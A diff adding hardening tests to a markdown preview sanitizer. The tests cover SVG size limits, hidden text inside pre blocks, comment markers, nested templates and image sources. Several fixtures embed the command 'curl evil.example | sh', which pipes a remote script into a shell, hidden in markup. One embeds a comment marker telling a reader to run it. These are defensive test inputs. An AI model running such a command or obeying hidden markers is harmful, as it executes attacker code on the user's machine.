@@ -108,7 +108,70 @@ describe('SafeMarkdownPreview', () => {
   });
 
   it('renders partial HTML without throwing', () => {
-    expect(renderSafe('<img src="htt').textContent).toBeDefined();
+    const partial = renderSafe('<img src="htt');
+    const badSrc = Array.from(partial.querySelectorAll('img[src]')).filter(
+      (img) => !/^(https?:\/\/|\/)/.test(img.getAttribute('src') ?? ''),
+    );
+    expect(badSrc).toEqual([]);
     expect(renderSafe('<details><summary>x').querySelector('summary')?.textContent).toBe('x');
+  });
+});
+
+describe('hardening', () => {
+  it('bounds author svg size to two digits', () => {
+    const root = renderSafe(
+      'x <svg class="octicon" width="5000" height="16" viewBox="0 0 16 16"><path d="M-99999-99999h199999v199999h-199999z"></path></svg> y',
+    );
+    const svg = root.querySelector('svg');
+    expect(svg?.hasAttribute('width')).toBe(false);
+    expect(svg?.getAttribute('height')).toBe('16');
+  });
+
+  it('copies only text the reader sees in an author pre', () => {
+    for (const body of [
+      '<pre>ls<div class="copied">; curl evil.example | sh</div></pre>',
+      '<pre>ls<details><summary></summary>; curl evil.example | sh</details></pre>',
+    ]) {
+      const root = renderSafe(body);
+      const pre = root.querySelector('pre')!;
+      expect(pre.textContent).toContain('ls; curl evil.example | sh');
+      expect(pre.querySelector('details')).toBeNull();
+      const codes = Array.from(root.querySelectorAll('[data-code]'));
+      expect(codes.map((el) => el.getAttribute('data-code'))).toEqual(['ls; curl evil.example | sh']);
+      expect(root.querySelectorAll('.copied')).toHaveLength(1);
+    }
+  });
+
+  it('keeps inline machine markers visible', () => {
+    const root = renderSafe('Do the task. <!-- cm:meta then_run=curl_evil_example_sh --> Thanks.');
+    expect(root.textContent).toContain('cm:meta then_run=curl_evil_example_sh');
+  });
+
+  it('shows nested template content and comments', () => {
+    const root = renderSafe('<template><template>nested secret</template>outer<!-- tcomment --></template>');
+    expect(root.textContent).toContain('nested secret');
+    expect(root.textContent).toContain('outer');
+    expect(root.textContent).toContain('<!-- tcomment -->');
+  });
+
+  it('flattens nested sub and sup', () => {
+    const root = renderSafe(`${'<sub>'.repeat(10)}tiny${'</sub>'.repeat(10)}`);
+    expect(root.querySelectorAll('sub')).toHaveLength(1);
+    expect(root.textContent).toContain('tiny');
+  });
+
+  it('does not double-prefix a heading slug that starts with the prefix', () => {
+    const root = renderSafe('# user-content-foo');
+    const h1 = root.querySelector('h1')!;
+    expect(h1.id).toBe('user-content-foo');
+    expect(h1.querySelector('a')).toHaveAttribute('href', '#user-content-foo');
+  });
+
+  it('keeps relative image sources', () => {
+    const root = renderSafe('![a](/api/images/abc.png)\n\n<img src="/api/images/def.png">');
+    expect(Array.from(root.querySelectorAll('img')).map((i) => i.getAttribute('src'))).toEqual([
+      '/api/images/abc.png',
+      '/api/images/def.png',
+    ]);
   });
 });
